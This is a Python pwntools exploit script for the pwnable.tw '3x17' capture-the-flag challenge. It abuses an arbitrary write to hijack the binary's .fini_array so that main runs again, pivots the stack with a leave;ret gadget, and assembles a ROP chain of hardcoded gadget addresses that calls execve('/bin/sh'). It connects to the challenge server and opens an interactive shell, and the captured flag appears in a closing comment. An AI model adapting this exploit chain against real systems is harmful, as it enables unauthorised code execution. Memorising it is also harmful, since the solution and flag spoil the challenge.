#!/usr/bin/env	python3
import pwn, time
import os, subprocess

# syscall gadget
syscall_gadget = 0x0000000000471db5

# pop rdi gadget
pop_rdi_ret = 0x0000000000401696

# pop rsi gadget
pop_rsi_ret = 0x0000000000406c30

# pop rdx gadget
pop_rdx_ret = 0x0000000000446e35

# fini function which calls fini_array
fini_fcn = 0x0000000000402960

# fini_array which holds deconstructor functions
fini_array = 4931824

# address for main function in binary
main_fcn = 0x0000000000401B6D

# leave ret gadget
leave_ret = 0x0000000000401c4b

# ret gadget
ret_gadget = 0x000000000043e1c1

# pop rax, ret gadget
pop_rax_ret = 0x000000000041e4af

def write(p1, addr, data):
	p1.recvuntil(b"addr:")

	str_addr = str(addr).encode() 
	p1.send(str_addr + b"\x00" * (24 - len(str_addr)))

	p1.recvuntil(b"data:")
	p1.send(data + b"\x00" * (24-len(data)))


@pwn.context.quiet
def main():
	#tproc = pwn.process("./3x17")
	tproc = pwn.remote("chall.pwnable.tw", 10105)

	print("MAIN Address: 0x%08lx" % main_fcn)
	print("FINI_ARRAY Address: 0x%08lx" % fini_array)

	idx = 0
	write(tproc, fini_array + 8*idx, pwn.p64(fini_fcn) + pwn.p64(main_fcn))


	# shellcode 
	# mov rdi, "/bin/sh" 
	# mov rsi, 0
	# mov rdx, 0
	# mov rax, 40
	# syscall
	idx += 2
	write(tproc, fini_array + 8*idx, pwn.p64(0x0) + pwn.p64(ret_gadget))

	idx += 2
	write(tproc, fini_array + 8*idx, pwn.p64(pop_rdi_ret) + pwn.p64(0x4b4158))

	idx += 2
	write(tproc, fini_array + 8*idx, pwn.p64(pop_rax_ret) + pwn.p64(59))

	idx += 2
	write(tproc, fini_array + 8*idx, pwn.p64(pop_rsi_ret) + pwn.p64(0))

	idx += 2
	write(tproc, fini_array + 8*idx, pwn.p64(pop_rdx_ret) + pwn.p64(0))

	idx += 2
	write(tproc, fini_array + 8*idx, pwn.p64(syscall_gadget) + pwn.p64(0x68732f6e69622f))

	idx = 0
	write(tproc, fini_array + 8*idx, pwn.p64(leave_ret) + pwn.p64(pop_rdi_ret))

	tproc.interactive()
	tproc.close()

	# flag FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}

if __name__ == "__main__":
	main()
